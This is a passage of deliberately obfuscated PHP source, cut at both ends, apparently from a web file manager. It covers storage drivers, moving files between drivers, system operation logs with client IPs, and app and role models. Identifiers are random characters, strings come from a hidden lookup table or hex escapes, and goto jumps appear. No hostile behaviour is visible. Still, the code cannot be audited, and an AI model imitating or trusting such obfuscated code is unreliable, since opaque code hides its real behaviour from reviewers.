json_decode($Á¿›Ù¼§[$–Çœ¬åæ[6]], !0); foreach ($«€×ƒåÃ as $£ş‚ØÎØ => $Óæ‚ğâÖ) { $«€×ƒåÃ[$£ş‚ØÎØ] = trim($Óæ‚ğâÖ); } $«€×ƒåÃ[$–Çœ¬åæ[2179]] = rand_string(6); $áÀÚÊ™ˆ = $GLOBALS[$–Çœ¬åæ[6]][$–Çœ¬åæ[99]][$–Çœ¬åæ[854]]; $¯Š€ï¢­ = isset($áÀÚÊ™ˆ[$Çşè]) ? $áÀÚÊ™ˆ[$Çşè] : ucfirst($Çşè); $”¢–š•¯ = $–Çœ¬åæ[84] . $¯Š€ï¢­; if (!$¯Š€ï¢­ || !class_exists($”¢–š•¯)) { if ($÷‘à™»¹) { return LNG($–Çœ¬åæ[2180]); } write_log(array($–Çœ¬åæ[2181], $Á¿›Ù¼§, get_caller_info()), $–Çœ¬åæ[2182]); show_json(LNG($–Çœ¬åæ[2180]), !1, $Á¿›Ù¼§); } $òõ…ºö¾ = new $”¢–š•¯($«€×ƒåÃ); if (in_array($Çşè, $òõ…ºö¾->objectDriver)) { if (!$òõ…ºö¾->isBucketCors() && !$òõ…ºö¾->setBucketCors()) { $‘¿ÑÙ£ = LNG($–Çœ¬åæ[2183]); $‘¿ÑÙ£ .= $–Çœ¬åæ[2184] . LNG($–Çœ¬åæ[2185]); if ($÷‘à™»¹) { return $‘¿ÑÙ£; } show_json($‘¿ÑÙ£, !1); } } $ßÖ€†á = rtrim($«€×ƒåÃ[$–Çœ¬åæ[1205]], $–Çœ¬åæ[8]) . $–Çœ¬åæ[8]; $Î¸Ò«²¨ = $òõ…ºö¾->getPath($ßÖ€†á . $–Çœ¬åæ[1209]); if (!$òõ…ºö¾->mkfile($Î¸Ò«²¨)) { if ($÷‘à™»¹) { return LNG($–Çœ¬åæ[2183]); } show_json(LNG($–Çœ¬åæ[2183]), !1); } $«€×ƒåÃ[$–Çœ¬åæ[1205]] = $ßÖ€†á; $Á¿›Ù¼§[$–Çœ¬åæ[6]] = json_encode($«€×ƒåÃ); $Á¿›Ù¼§[$–Çœ¬åæ[105]] = $¯Š€ï¢­; return !0; } public function driverListSystem() { $¢É×¶³å =& $_SERVER[ªÏ§Ë·]; $Ê™“æ” = parent::listData(); $¿¡Û•˜ = array(); foreach ($Ê™“æ” as $¤ñÌÂÌ) { unset($¤ñÌÂÌ[$¢É×¶³å[211]], $¤ñÌÂÌ[$¢É×¶³å[95]]); $¤ñÌÂÌ[$¢É×¶³å[6]] = json_decode($¤ñÌÂÌ[$¢É×¶³å[6]], !0); $¿¡Û•˜[] = $¤ñÌÂÌ; } return $¿¡Û•˜; } public function defaultDriver() { $¯à±‚‡ˆ =& $_SERVER[ªÏ§Ë·]; $µ¹¤¢œÇ = parent::listData(); $„Ã²±„ = array_filter_by_field($µ¹¤¢œÇ, $¯à±‚‡ˆ[47], 1); $„Ã²±„ = $„Ã²±„[0]; if ($„Ã²±„) { $„Ã²±„[$¯à±‚‡ˆ[6]] = json_decode($„Ã²±„[$¯à±‚‡ˆ[6]], !0); } return $„Ã²±„; } public function driverInfo($Ì¸í©Ê) { $ìÈèê¡¸ =& $_SERVER[ªÏ§Ë·]; $–‰ŠµÃ = array_to_keyvalue(parent::listData(), $ìÈèê¡¸[437]); if (!isset($–‰ŠµÃ[$Ì¸í©Ê])) { return !1; } $•ØçÔÑí = $–‰ŠµÃ[$Ì¸í©Ê]; $•ØçÔÑí[$ìÈèê¡¸[6]] = json_decode($•ØçÔÑí[$ìÈèê¡¸[6]], !0); return $•ØçÔÑí; } public function remove($Óãç) { $this->removeShareItems($Óãç); return parent::remove($Óãç); } public function removeWithFile($êÈ“¥ª, $é½ŒÆ’) { $áÖ¾¥©Í =& $_SERVER[ªÏ§Ë·]; $´õ©Ö‰ = array($áÖ¾¥©Í[845] => $êÈ“¥ª); $¯°ì÷º‰ = Model($áÖ¾¥©Í[509])->where($´õ©Ö‰)->count(); $ËşŒı£ = Model($áÖ¾¥©Í[509])->where($´õ©Ö‰)->sum($áÖ¾¥©Í[86]); $£é»ÂŸ¥ = $é½ŒÆ’ . $áÖ¾¥©Í[2186] . $êÈ“¥ª; $¤ùÅèºä = LNG($é½ŒÆ’ == $áÖ¾¥©Í[586] ? $áÖ¾¥©Í[2187] : $áÖ¾¥©Í[2188]); $ç†ÌÆ®¼ = new TaskFileTransfer($£é»ÂŸ¥, $áÖ¾¥©Í[2182], $¯°ì÷º‰, $¤ùÅèºä . "\50{$êÈ“¥ª}\x29"); $ç†ÌÆ®¼->task[$áÖ¾¥©Í[791]] = (double) $ËşŒı£; $óäôÚ—Á = KodIO::defaultDriver(); $±¦­Ñ×ì = $óäôÚ—Á[$áÖ¾¥©Í[437]]; $ÕéöïŞ¢ = "\173\151\x6f\72{$±¦­Ñ×ì}\x7d\x2f"; $Ôà†¡”– = !0; $Èº“Øª = array(); $¢Ë¢È“ = Model($áÖ¾¥©Í[210])->where($´õ©Ö‰)->field($áÖ¾¥©Í[2189])->select(); foreach ($¢Ë¢È“ as $ÛÎ²•¡) { $ÈÕœŠº¹ = $ÛÎ²•¡[$áÖ¾¥©Í[94]]; $êşÉ¿ƒ– = $ÕéöïŞ¢ . str_replace("\173\151\157\72{$êÈ“¥ª}\175\57", $áÖ¾¥©Í[12], $ÈÕœŠº¹); if (!IO::exist($ÈÕœŠº¹)) { $Èº“Øª[] = $ÛÎ²•¡[$áÖ¾¥©Í[506]]; $ç†ÌÆ®¼->updateFileEnd($ÛÎ²•¡[$áÖ¾¥©Í[42]], $ÛÎ²•¡[$áÖ¾¥©Í[86]]); continue; } if (IO::exist($êşÉ¿ƒ–)) { $ç†ÌÆ®¼->updateFileEnd($ÛÎ²•¡[$áÖ¾¥©Í[42]], $ÛÎ²•¡[$áÖ¾¥©Í[86]]); continue; } if (!IO::move($ÈÕœŠº¹, get_path_father($êşÉ¿ƒ–))) { $Ôà†¡”– = !1; break; } $´õ©Ö‰ = array($áÖ¾¥©Í[506] => $ÛÎ²•¡[$áÖ¾¥©Í[506]]); $¼ÀìÂµ = array($áÖ¾¥©Í[845] => $±¦­Ñ×ì, $áÖ¾¥©Í[94] => $êşÉ¿ƒ–); Model($áÖ¾¥©Í[210])->where($´õ©Ö‰)->save($¼ÀìÂµ); } $this->removeByFileID($Èº“Øª); if (!$Ôà†¡”–) { $ç†ÌÆ®¼->stop($£é»ÂŸ¥); return !1; } $ç†ÌÆ®¼->end(); if ($é½ŒÆ’ == $áÖ¾¥©Í[1826]) { $this->remove($êÈ“¥ª); } } public function progress($»Åè–», $Œ¯ç’ªÉ) { return Task::get($Œ¯ç’ªÉ . $_SERVER[ªÏ§Ë·][2186] . $»Åè–»); } private function removeByFileID($¤‡ğ†Ï = array()) { $ëÑ¬¶®¾ =& $_SERVER[ªÏ§Ë·]; if (empty($¤‡ğ†Ï)) { return; } $õ½ô’€ = array($ëÑ¬¶®¾[506] => array($ëÑ¬¶®¾[7], $¤‡ğ†Ï)); $™Öä—“ = Model($ëÑ¬¶®¾[1358])->where($õ½ô’€)->field($ëÑ¬¶®¾[440])->select(); if (!$™Öä—“) { return; } $™Öä—“ = array_to_keyvalue($™Öä—“, $ëÑ¬¶®¾[12], $ëÑ¬¶®¾[440]); foreach ($™Öä—“ as $ïÌ¹ùÑ) { Model($ëÑ¬¶®¾[454])->removeNow($ïÌ¹ùÑ, !1); } } private function removeShareItems($ˆÓÔÇÅ“) { $ƒÕÑ¹ñã =& $_SERVER[ªÏ§Ë·]; $äòä´© = "\173\x69\157\x3a{$ˆÓÔÇÅ“}\175\57"; $´ø•ÏĞ± = array($ƒÕÑ¹ñã[440] => 0, $ƒÕÑ¹ñã[1200] => array($ƒÕÑ¹ñã[421], "{$äòä´©}\x25")); $Ë…¯„ò† = Model($ƒÕÑ¹ñã[1837])->where($´ø•ÏĞ±)->field($ƒÕÑ¹ñã[631])->select(); if (empty($Ë…¯„ò†)) { return; } $Á©¦°‚ë = array_to_keyvalue($Ë…¯„ò†, $ƒÕÑ¹ñã[12], $ƒÕÑ¹ñã[631]); Model($ƒÕÑ¹ñã[630])->remove($Á©¦°‚ë); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\x2e\x4c\151\147\150\164\x41\x70\160"; public $modelType = "\123\171\163\164\x65\x6d\x4f\160\x74\151\157\x6e"; public $field = array("\156\141\155\145", "\147\x72\157\165\x70", "\x64\x65\163\143", "\x63\x6f\156\164\x65\x6e\164"); public function listData($‹â§¸ä = false, $Ø’­ô“è = "\155\157\x64\151\146\x79\x54\x69\x6d\145", $úèÚòğ— = true) { return parent::listData($‹â§¸ä, $Ø’­ô“è, $úèÚòğ—); } public function remove($ıûŞŒøµ) { $°èŠøĞ = $this->findByName($ıûŞŒøµ); if (!$°èŠøĞ) { return !1; } return parent::remove($°èŠøĞ[$_SERVER[ªÏ§Ë·][437]]); } public function add($‡ü°ğ‡˜) { if ($this->findByName($‡ü°ğ‡˜[$_SERVER[ªÏ§Ë·][42]])) { return !1; } return parent::insert($‡ü°ğ‡˜); } public function update($™·×²ëŞ, $…ÑúˆËã) { $¶¨€™ô¶ =& $_SERVER[ªÏ§Ë·]; $èÃ¹·Êº = $this->findByName($™·×²ëŞ); $¨Õì¸º­ = $this->findByName($…ÑúˆËã[$¶¨€™ô¶[42]]); if (!$èÃ¹·Êº || $¨Õì¸º­ && $¨Õì¸º­[$¶¨€™ô¶[437]] != $èÃ¹·Êº[$¶¨€™ô¶[437]]) { return !1; } return parent::update($èÃ¹·Êº[$¶¨€™ô¶[437]], $…ÑúˆËã); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\145\155\137\x6c\x6f\147"; protected $dataAuto = array(array("\x63\162\x65\141\164\145\124\x69\155\145", "\x74\x69\x6d\145", "\x69\156\163\x65\x72\x74", "\146\165\156\x63\x74\x69\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $¯•¼ù =& $_SERVER[ªÏ§Ë·]; return array($¯•¼ù[2190] => LNG($¯•¼ù[2191]), $¯•¼ù[2192] => LNG($¯•¼ù[2193]), $¯•¼ù[1800] => LNG($¯•¼ù[2194]), $¯•¼ù[2195] => LNG($¯•¼ù[2196]), $¯•¼ù[2197] => LNG($¯•¼ù[2198]), $¯•¼ù[2199] => LNG($¯•¼ù[2200]), $¯•¼ù[2201] => LNG($¯•¼ù[2202]), $¯•¼ù[1830] => LNG($¯•¼ù[2202]), $¯•¼ù[1831] => LNG($¯•¼ù[2203]), $¯•¼ù[2204] => LNG($¯•¼ù[2205]), $¯•¼ù[2206] => LNG($¯•¼ù[2207]), $¯•¼ù[2208] => LNG($¯•¼ù[2209]), $¯•¼ù[2210] => LNG($¯•¼ù[2211]), $¯•¼ù[1828] => LNG($¯•¼ù[2212]), $¯•¼ù[2213] => LNG($¯•¼ù[2214]), $¯•¼ù[1835] => LNG($¯•¼ù[2215]), $¯•¼ù[2216] => LNG($¯•¼ù[2217]), $¯•¼ù[2218] => LNG($¯•¼ù[2219]), $¯•¼ù[2220] => LNG($¯•¼ù[2221]), $¯•¼ù[2222] => LNG($¯•¼ù[2223]), $¯•¼ù[1838] => LNG($¯•¼ù[2224]), $¯•¼ù[1839] => LNG($¯•¼ù[2225]), $¯•¼ù[2226] => LNG($¯•¼ù[2227]), $¯•¼ù[2228] => LNG($¯•¼ù[2229]), $¯•¼ù[2230] => LNG($¯•¼ù[2231]), $¯•¼ù[1833] => LNG($¯•¼ù[2232]), $¯•¼ù[2233] => LNG($¯•¼ù[2234]), $¯•¼ù[1832] => LNG($¯•¼ù[2235]), $¯•¼ù[2236] => LNG($¯•¼ù[2237]), $¯•¼ù[2238] => LNG($¯•¼ù[2239]), $¯•¼ù[2240] => LNG($¯•¼ù[2241]), $¯•¼ù[2242] => LNG($¯•¼ù[2242]), $¯•¼ù[2243] => LNG($¯•¼ù[1804]), $¯•¼ù[2244] => LNG($¯•¼ù[2245]), $¯•¼ù[2246] => LNG($¯•¼ù[2247]), $¯•¼ù[2248] => LNG($¯•¼ù[2249]), $¯•¼ù[2250] => LNG($¯•¼ù[2251]), $¯•¼ù[2252] => LNG($¯•¼ù[2253]), $¯•¼ù[2254] => LNG($¯•¼ù[2254]), $¯•¼ù[2255] => LNG($¯•¼ù[2256]), $¯•¼ù[2257] => LNG($¯•¼ù[2258]), $¯•¼ù[2259] => LNG($¯•¼ù[2260]), $¯•¼ù[2261] => LNG($¯•¼ù[2262]), $¯•¼ù[2263] => LNG($¯•¼ù[2264]), $¯•¼ù[2265] => LNG($¯•¼ù[2266])); } private function typeFile() { $‹ÃŞıî¹ =& $_SERVER[ªÏ§Ë·]; $ıĞÔš±Ë = array($‹ÃŞıî¹[1835] => array($‹ÃŞıî¹[1836]), $‹ÃŞıî¹[2208] => array($‹ÃŞıî¹[2267]), $‹ÃŞıî¹[2210] => array($‹ÃŞıî¹[2268]), $‹ÃŞıî¹[1828] => array($‹ÃŞıî¹[1829]), $‹ÃŞıî¹[2218] => array(), $‹ÃŞıî¹[2220] => array(), $‹ÃŞıî¹[2222] => array(), $‹ÃŞıî¹[1838] => array($‹ÃŞıî¹[1840]), $‹ÃŞıî¹[1839] => array($‹ÃŞıî¹[1840]), $‹ÃŞıî¹[2226] => array($‹ÃŞıî¹[2269]), $‹ÃŞıî¹[2228] => array($‹ÃŞıî¹[2269]), $‹ÃŞıî¹[2230] => array($‹ÃŞıî¹[2270]), $‹ÃŞıî¹[2216] => array($‹ÃŞıî¹[2271]), $‹ÃŞıî¹[1833] => array($‹ÃŞıî¹[2272]), $‹ÃŞıî¹[2233] => array($‹ÃŞıî¹[2273]), $‹ÃŞıî¹[1832] => array($‹ÃŞıî¹[1834])); return $ıĞÔš±Ë; } private function typeAll() { $ğõ®ÔÜ =& $_SERVER[ªÏ§Ë·]; $Ü‰¡åº  = $this->typeList; $¶¢‚¸Æ— = array_filter($this->typeFile()); foreach ($¶¢‚¸Æ— as $–»Æ¢ˆ„ => $ÓÆãÏë) { $Ü‰¡åº [$ÓÆãÏë[0]] = $Ü‰¡åº [$–»Æ¢ˆ„]; } $Ü‰¡åº [$ğõ®ÔÜ[1840]] = LNG($ğõ®ÔÜ[2274]); $Ü‰¡åº [$ğõ®ÔÜ[2269]] = LNG($ğõ®ÔÜ[2275]); return $Ü‰¡åº ; } public function addLog($¢¯´ö€Æ, $€Ïûúç = array()) { $û©ëêŠò =& $_SERVER[ªÏ§Ë·]; if (!isset($this->typeList[$¢¯´ö€Æ])) { return; } $‚ÒÖ« = isset($€Ïûúç[$û©ëêŠò[1667]]) ? $€Ïûúç[$û©ëêŠò[1667]] : 0; if (!$‚ÒÖ«) { $‚ÒÖ« = Session::get($û©ëêŠò[1994]); } if ($¢¯´ö€Æ == $û©ëêŠò[2244] && is_array($€Ïûúç[$û©ëêŠò[2276]]) && !$€Ïûúç[$û©ëêŠò[2276]]) { return; } $¸à·÷Ÿ§ = get_client_ip(); if (!$€Ïûúç || strlen(json_encode($€Ïûúç)) >= 1024) { $€Ïûúç = array($û©ëêŠò[2277] => $¸à·÷Ÿ§); } else { if (is_array($€Ïûúç)) { $€Ïûúç[$û©ëêŠò[2277]] = $¸à·÷Ÿ§; } else { $€Ïûúç = array($û©ëêŠò[1227] => $€Ïûúç, $û©ëêŠò[2277] => $¸à·÷Ÿ§); } } $€Ïûúç = array($û©ëêŠò[1657] => Session::sign(), $û©ëêŠò[1658] => intval($‚ÒÖ«), $û©ëêŠò[43] => $¢¯´ö€Æ, $û©ëêŠò[1660] => json_encode($€Ïûúç)); parent::add($€Ïûúç); } public function remove($ÑÊÓ™â) { $this->where(array($_SERVER[ªÏ§Ë·][457] => $ÑÊÓ™â))->delete(); } private function _makeOrder($º¬¹ÕúŸ = '') { $ì‚ëÛ¨Ñ =& $_SERVER[ªÏ§Ë·]; $•ºŞš½† = $ì‚ëÛ¨Ñ[211]; $ªìŒÈÁÔ = array($ì‚ëÛ¨Ñ[488] => $ì‚ëÛ¨Ñ[489], $ì‚ëÛ¨Ñ[490] => $ì‚ëÛ¨Ñ[491]); $¶œ”Ñı€ = Input::get($ì‚ëÛ¨Ñ[496], $ì‚ëÛ¨Ñ[7], $ì‚ëÛ¨Ñ[2030], array($ì‚ëÛ¨Ñ[1948], $ì‚ëÛ¨Ñ[490])); $¶œ”Ñı€ = $ªìŒÈÁÔ[$¶œ”Ñı€]; $º¬¹ÕúŸ = $º¬¹ÕúŸ . "{$•ºŞš½†}\x20{$¶œ”Ñı€}"; return $this->order($º¬¹ÕúŸ); } public function get($Çû‚’ƒ¯ = '') { $à©²¸İ =& $_SERVER[ªÏ§Ë·]; if (!$Çû‚’ƒ¯) { show_json(array()); } $á’õ°ÉÚ = array(); if ($Çû‚’ƒ¯[$à©²¸İ[1667]]) { $á’õ°ÉÚ[$à©²¸İ[1667]] = $Çû‚’ƒ¯[$à©²¸İ[1667]]; } if (isset($Çû‚’ƒ¯[$à©²¸İ[788]])) { $·õˆ’€¢ = $Çû‚’ƒ¯[$à©²¸İ[788]]; $ƒæëï©» = isset($Çû‚’ƒ¯[$à©²¸İ[789]]) ? $Çû‚’ƒ¯[$à©²¸İ[789]] : time(); $á’õ°ÉÚ[$à©²¸İ[211]] = array($à©²¸İ[371], array($·õˆ’€¢, $ƒæëï©»)); } if ($Çû‚’ƒ¯[$à©²¸İ[43]]) { $¼îÖè™é = explode($à©²¸İ[60], $Çû‚’ƒ¯[$à©²¸İ[43]]); $ÔÙ¡òÒå = $this->typeFile(); $°©½¢ş = array(); foreach ($¼îÖè™é as $Ëş¢èĞš) { $°©½¢ş[] = $Ëş¢èĞš; if (isset($ÔÙ¡òÒå[$Ëş¢èĞš])) { $°©½¢ş = array_merge($°©½¢ş, $ÔÙ¡òÒå[$Ëş¢èĞš]); } } $°©½¢ş = array_unique($°©½¢ş); if ($°©½¢ş) { $á’õ°ÉÚ[$à©²¸İ[43]] = array($à©²¸İ[7], $°©½¢ş); } } else { $á’õ°ÉÚ[$à©²¸İ[43]] = array($à©²¸İ[2278], $à©²¸İ[2279]); } if (!empty($Çû‚’ƒ¯[$à©²¸İ[2277]])) { $á’õ°ÉÚ[$à©²¸İ[491]] = array($à©²¸İ[421], "\x25{$Çû‚’ƒ¯[$à©²¸İ[2277]]}\x25"); } $ÊÍÀ¥ŠÁ = $this->_makeOrder()->where($á’õ°ÉÚ)->selectPage(); if (empty($ÊÍÀ¥ŠÁ[$à©²¸İ[407]])) { show_json(array(), !0, $ÊÍÀ¥ŠÁ[$à©²¸İ[404]]); } $ÊÍÀ¥ŠÁ[$à©²¸İ[407]] = $this->logList($ÊÍÀ¥ŠÁ[$à©²¸İ[407]]); return $ÊÍÀ¥ŠÁ; } private function ipAddress(&$ÇŞÔ‚¦ ) { $ú•ß—ü¨ =& $_SERVER[ªÏ§Ë·]; if (!empty($ÇŞÔ‚¦ [$ú•ß—ü¨[2277]])) { $€†‡¨‰Æ = IpLocation::get($ÇŞÔ‚¦ [$ú•ß—ü¨[2277]]); } else { $€†‡¨‰Æ = LNG($ú•ß—ü¨[2280]); } $ÇŞÔ‚¦ [$ú•ß—ü¨[2281]] = $€†‡¨‰Æ; } private function descZipDownload($Í—›¡ó·, &$ŒÀæ¹ô²) { $¡ÏØ§¨ =& $_SERVER[ªÏ§Ë·]; if (!isset($Í—›¡ó·[$¡ÏØ§¨[2282]])) { return; } $Ç½Ó°Ôû = json_decode($Í—›¡ó·[$¡ÏØ§¨[2282]], !0); foreach ($Ç½Ó°Ôû as $¤Á•ï¡æ) { try { $¡‰ÍÓ—÷ = IO::infoFull($¤Á•ï¡æ[$¡ÏØ§¨[94]]); } catch (Exception $¹¢“è½Û) { continue; } $Í—›¡ó·[$¡ÏØ§¨[94]] = $¤Á•ï¡æ[$¡ÏØ§¨[94]]; $ŒÀæ¹ô²[] = $Í—›¡ó·[$¡ÏØ§¨[440]] = $¡‰ÍÓ—÷[$¡ÏØ§¨[440]]; $ŒÀæ¹ô²[] = $Í—›¡ó·[$¡ÏØ§¨[2085]] = $¡‰ÍÓ—÷[$¡ÏØ§¨[470]]; break; } return $Í—›¡ó·; } private function getSourceList(&$îŒ”å¤İ) { $¯³´„úÑ =& $_SERVER[ªÏ§Ë·]; $ ğİ‚š• = array(); foreach ($îŒ”å¤İ as $«™õö¹€ => $ü¨ş›Ã†) { $¸¿èºÎú = json_decode($ü¨ş›Ã†[$¯³´„úÑ[491]], !0); if ($ü¨ş›Ã†[$¯³´„úÑ[43]] == $¯³´„úÑ[1831]) { $¸¿èºÎú = $this->descZipDownload($¸¿èºÎú, $ ğİ‚š•); $îŒ”å¤İ[$«™õö¹€][$¯³´„úÑ[491]] = json_encode($¸¿èºÎú); continue; } if (strpos($ü¨ş›Ã†[$¯³´„úÑ[43]], $¯³´„úÑ[2087]) !== 0) { if (!isset($¸¿èºÎú[$¯³´„úÑ[94]]) || strpos($ü¨ş›Ã†[$¯³´„úÑ[43]], $¯³´„úÑ[2283]) !== 0) { continue; } try { $ëéÙûã® = IO::infoFull($¸¿èºÎú[$¯³´„úÑ[94]]); } catch (Exception $¼€ñ¬Á) { continue; } $ ğİ‚š•[] = $¸¿èºÎú[$¯³´„úÑ[440]] = $ëéÙûã®[$¯³´„úÑ[440]]; $ ğİ‚š•[] = $¸¿èºÎú[$¯³´„úÑ[2085]] = $ëéÙûã®[$¯³´„úÑ[470]]; $îŒ”å¤İ[$«™õö¹€][$¯³´„úÑ[491]] = json_encode($¸¿èºÎú); continue; } $ ğİ‚š•[] = $¸¿èºÎú[$¯³´„úÑ[440]]; $ ğİ‚š•[] = $¸¿èºÎú[$¯³´„úÑ[2085]]; if ($¸¿èºÎú[$¯³´„úÑ[43]] == $¯³´„úÑ[586]) { $ ğİ‚š•[] = $¸¿èºÎú[$¯³´„úÑ[491]][$¯³´„úÑ[1185]]; $ ğİ‚š•[] = $¸¿èºÎú[$¯³´„úÑ[491]][$¯³´„úÑ[1186]]; } if ($¸¿èºÎú[$¯³´„úÑ[43]] == $¯³´„úÑ[2095]) { $ ğİ‚š•[] = $¸¿èºÎú[$¯³´„úÑ[491]][$¯³´„úÑ[440]]; } } if (!$ ğİ‚š•) { return array(); } return Model($¯³´„úÑ[853])->sourceListInfo($ ğİ‚š•, !0); } private function logList($‹ÆÑ²»í) { $«¹à‚” =& $_SERVER[ªÏ§Ë·]; $ûÁî×„­ = array_to_keyvalue($‹ÆÑ²»í, $«¹à‚”[12], $«¹à‚”[1667]); $Š„şû = Model($«¹à‚”[563])->userListInfo(array_unique($ûÁî×„­)); $Ñ¥¾¢ = $this->getSourceList($‹ÆÑ²»í); $Îšîµ¬ = $this->typeAll(); $ÇÂÓÚ× = array(); $ş¨‰•âó = array(); foreach ($‹ÆÑ²»í as $ÔşÏÎ—º => $Éè Ÿå) { $õ‰ì¹¼ = $Éè Ÿå[$«¹à‚”[43]]; $³Æ½­Îï = isset($Š„şû[$Éè Ÿå[$«¹à‚”[1667]]]) ? $Š„şû[$Éè Ÿå[$«¹à‚”[1667]]] : !1; $…²±£ğ¬ = strpos($õ‰ì¹¼, $«¹à‚”[2284]) === 0 ? LNG($«¹à‚”[2285]) : LNG($«¹à‚”[2280]); $Éè Ÿå[$«¹à‚”[42]] = isset($³Æ½­Îï[$«¹à‚”[42]]) ? $³Æ½­Îï[$«¹à‚”[42]] : LNG($«¹à‚”[2280]); $Éè Ÿå[$«¹à‚”[570]] = isset($³Æ½­Îï[$«¹à‚”[570]]) ? $³Æ½­Îï[$«¹à‚”[570]] : $«¹à‚”[12]; $Éè Ÿå[$«¹à‚”[1567]] = isset($Îšîµ¬[$õ‰ì¹¼]) ? $Îšîµ¬[$õ‰ì¹¼] : $…²±£ğ¬; $Éè Ÿå[$«¹à‚”[2029]] = $³Æ½­Îï; $©ìÉÑŒŞ = json_decode($Éè Ÿå[$«¹à‚”[491]], !0); $Éè Ÿå[$«¹à‚”[2277]] = isset($©ìÉÑŒŞ[$«¹à‚”[2277]]) ? $©ìÉÑŒŞ[$«¹à‚”[2277]] : $«¹à‚”[12]; $Éè Ÿå[$«¹à‚”[2281]] = IpLocation::get($Éè Ÿå[$«¹à‚”[2277]]); if (strpos($õ‰ì¹¼, $«¹à‚”[2087]) === 0 || isset($©ìÉÑŒŞ[$«¹à‚”[2085]])) { $©ìÉÑŒŞ[$«¹à‚”[97]] = $Ñ¥¾¢[$©ìÉÑŒŞ[$«¹à‚”[440]]]; $©ìÉÑŒŞ[$«¹à‚”[2100]] = $Ñ¥¾¢[$©ìÉÑŒŞ[$«¹à‚”[2085]]]; if ($©ìÉÑŒŞ[$«¹à‚”[43]] == $«¹à‚”[586]) { $©ìÉÑŒŞ[$«¹à‚”[491]][$«¹à‚”[1185]] = $Ñ¥¾¢[$©ìÉÑŒŞ[$«¹à‚”[491]][$«¹à‚”[1185]]]; $©ìÉÑŒŞ[$«¹à‚”[491]][$«¹à‚”[1186]] = $Ñ¥¾¢[$©ìÉÑŒŞ[$«¹à‚”[491]][$«¹à‚”[1186]]]; } if ($©ìÉÑŒŞ[$«¹à‚”[43]] == $«¹à‚”[2095]) { $©ìÉÑŒŞ[$«¹à‚”[491]][$«¹à‚”[440]] = $Ñ¥¾¢[$©ìÉÑŒŞ[$«¹à‚”[491]][$«¹à‚”[440]]]; } if ($©ìÉÑŒŞ[$«¹à‚”[43]] == $«¹à‚”[1826]) { $©ìÉÑŒŞ[$«¹à‚”[2100]] = $©ìÉÑŒŞ[$«¹à‚”[97]]; $©ìÉÑŒŞ[$«¹à‚”[2085]] = $©ìÉÑŒŞ[$«¹à‚”[2100]][$«¹à‚”[440]]; $©ìÉÑŒŞ[$«¹à‚”[97]] = !1; $©ìÉÑŒŞ[$«¹à‚”[440]] = $«¹à‚”[12]; } if ($©ìÉÑŒŞ[$«¹à‚”[97]] && $©ìÉÑŒŞ[$«¹à‚”[97]][$«¹à‚”[449]] == $«¹à‚”[1312]) { $ş¨‰•âó[] = $Éè Ÿå[$«¹à‚”[437]]; unset($‹ÆÑ²»í[$ÔşÏÎ—º]); continue; } if ($©ìÉÑŒŞ[$«¹à‚”[2100]] && $©ìÉÑŒŞ[$«¹à‚”[2100]][$«¹à‚”[449]] == $«¹à‚”[1312]) { $ş¨‰•âó[] = $Éè Ÿå[$«¹à‚”[437]]; unset($‹ÆÑ²»í[$ÔşÏÎ—º]); continue; } } $Éè Ÿå[$«¹à‚”[491]] = $©ìÉÑŒŞ; unset($Éè Ÿå[$«¹à‚”[2286]]); $ÇÂÓÚ×[] = $Éè Ÿå; } $this->clearSystemPathLog($ş¨‰•âó); return $ÇÂÓÚ×; } private function clearSystemPathLog($—Ò­Û¾‰) { $é®»¦›Ä =& $_SERVER[ªÏ§Ë·]; if (count($—Ò­Û¾‰) == 0) { return; } $úû‘Øà = array($é®»¦›Ä[437] => array($é®»¦›Ä[7], array_unique($—Ò­Û¾‰))); $this->where($úû‘Øà)->delete(); } public function deviceList($˜µÂÊ—ã, $Ş–ˆá—ì = 0) { $ÚÈ¿Èûš =& $_SERVER[ªÏ§Ë·]; $¤áòµë„ = array($ÚÈ¿Èûš[1667] => $˜µÂÊ—ã, $ÚÈ¿Èûš[211] => array($ÚÈ¿Èûš[1039], $Ş–ˆá—ì), $ÚÈ¿Èûš[43] => $ÚÈ¿Èûš[1800]); $ˆ×­Á²½ = array(); $ÕË°Øº = $this->field($ÚÈ¿Èûš[2287])->where($¤áòµë„)->order($ÚÈ¿Èûš[2098])->limit(50)->select(); foreach ($ÕË°Øº as $¡ƒĞ¤›Ù => $è®à©Ûù) { if ($¡ƒĞ¤›Ù > 0 && abs($è®à©Ûù[$ÚÈ¿Èûš[211]] - $ÕË°Øº[$¡ƒĞ¤›Ù - 1][$ÚÈ¿Èûš[211]]) < 5) { continue; } $ŠÆëÓÏ = json_decode($è®à©Ûù[$ÚÈ¿Èûš[491]], !0); $è®à©Ûù[$ÚÈ¿Èûš[2277]] = isset($ŠÆëÓÏ[$ÚÈ¿Èûš[2277]]) ? $ŠÆëÓÏ[$ÚÈ¿Èûš[2277]] : $ÚÈ¿Èûš[12]; unset($ŠÆëÓÏ[$ÚÈ¿Èûš[2277]]); $‰› ÕãÎ = $this->deviceType($ŠÆëÓÏ[$ÚÈ¿Èûš[2088]]); if (isset($ˆ×­Á²½[$‰› ÕãÎ])) { continue; } $è®à©Ûù[$ÚÈ¿Èûš[2281]] = IpLocation::get($è®à©Ûù[$ÚÈ¿Èûš[2277]]); $è®à©Ûù[$ÚÈ¿Èûš[491]] = $ŠÆëÓÏ; $ˆ×­Á²½[$‰› ÕãÎ] = $è®à©Ûù; } return array_values($ˆ×­Á²½); } public function deviceType($÷À­÷îŠ) { return $÷À­÷îŠ; } } goto FÆ¿»±‹È˜; b°®ˆÄ¶‹: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\56\x72\157\x6c\x65\114\x69\163\164"; public $field = array("\156\x61\155\145", "\141\165\164\x68", "\x6c\141\142\x65\x6c", "\144\151\x73\x70\x6c\141\171", "\163\171\163\x74\x65\155", "\144\145\x73\x63", "\x69\147\156\157\162\x65\x45\x78\164", "\x69\147\156\x6f\162\x65\106\151\154\x65\x53\x69\172\145", "\x61\144\x6d\151\x6e\x69\163\164\162\x61\164\x6f\x72", "\x73\x6f\162\x74"); public function listData($Çùú¸ÄË = false, $ŞŞò‡º = "\163\x6f\x72\164", $ÌÇèÌ = false) { $’£Ú’ =& $_SERVER[ªÏ§Ë·]; $ÊÀÄÃ´— = parent::listData($Çùú¸ÄË, $ŞŞò‡º, $ÌÇèÌ); if (!$Çùú¸ÄË) { foreach 